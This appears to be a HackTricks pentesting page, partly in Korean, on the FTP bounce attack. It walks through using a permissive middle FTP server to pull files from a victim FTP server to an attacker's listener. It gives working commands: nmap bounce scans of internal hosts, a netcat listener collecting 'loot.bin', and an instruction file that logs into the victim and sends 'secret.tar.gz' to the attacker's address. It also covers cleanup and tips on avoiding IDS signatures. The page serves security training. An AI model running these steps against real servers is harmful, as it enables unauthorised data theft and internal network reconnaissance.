# FTP Bounce Download 2 of FTP File

{{#include ../../banners/hacktricks-training.md}}


## 요약

If you have access to a **bounce FTP server**, you can make it request files of **another FTP server** (where you know some credentials) and download that file to **your own server**.

## 요구 사항

- FTP valid credentials in the **FTP Middle server**
- FTP valid credentials in **Victim FTP server**
- Both servers **accept the `PORT` command** (bounce FTP attack)
- You can **write** inside some directory of the **FTP Middle server**
- The middle server has **more access** inside the Victim FTP Server than you

## 단계

1. Connect to **your own FTP server** and make the connection passive (`pasv` command) so it **listens** in a directory where the victim service will send the file.
2. Craft the file the FTP Middle server will send to the Victim server (the **exploit script**). This file will be plain text with the needed commands to authenticate against the Victim server, change the directory and download a file to your own server.
3. Connect to the **FTP Middle Server** and upload the previous file.
4. Make the FTP Middle server **establish a connection** with the Victim server and send the exploit file.
5. **Capture** the file in your own FTP server.
6. **Delete** the exploit file from the FTP Middle server.

## Quick check for vulnerable bounce hosts

- **Nmap** still supports FTP bounce checks. Example to verify a potential middle server:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
서버가 제3자 `PORT` 값을 거부하면 스캔이 실패합니다; 일부 **embedded/legacy printers, NAS and appliance FTP daemons**는 여전히 이를 허용합니다.

## Automating the 2nd FTP download

아래는 취약한 중간 FTP 서버를 통해 파일을 가져오는 모던한 방법입니다.

1. **Open a passive listener** on your attack box (any TCP sink works):
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **Note** your IP as `A,B,C,D` and port `P` as `p1,p2` (`p1 = P/256`, `p2 = P%256`).

3. **Build the instruction file** that the middle server will replay to the victim:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Upload & trigger from the middle server** (classic proxy FTP):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Grab the file** from your listener (`loot.bin`).
6. **Clean up** the uploaded `instrs` file on the middle server.

노트:
- 패딩(`dd ...`)은 RETR이 끝나기 전에 제어 연결이 닫히는 것을 방지합니다(고전적 문서에서 다루는 큰 TCP 윈도우 문제).
- TCP를 **listen**하고 덤프할 수 있는 어떤 서비스라도 FTP PASV 소켓을 대체할 수 있습니다(예: `socat -u TCP-LISTEN:2121,fork - > loot.bin`).
- 중간 서버가 privileged 포트를 제한하면 `PORT`에 높은 포트를 사용하고 리스너를 그에 맞춰 조정하세요.

## Extra tricks

- 파일 중계가 차단된 경우, bounceable FTP 서버를 사용해 내부 호스트를 **포트 스캔**할 수 있습니다:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- 일부 현대 WAF/IDS(예: Juniper IPS)는 **FTP:EXPLOIT:BOUNCE-ATTACK**에 대한 시그니처를 포함합니다; 시끄러운 페이로드나 누락된 패딩이 탐지를 유발할 수 있습니다.
- 중간 서버가 "PORT to same host" 제한을 적용하면, (쓰기/실행 권한이 있다면) **리스너를 중간 서버 자체에 배치**하고 이후 캡처한 파일을 전달하세요.

For a more detailed old-school walkthrough check: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## References

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
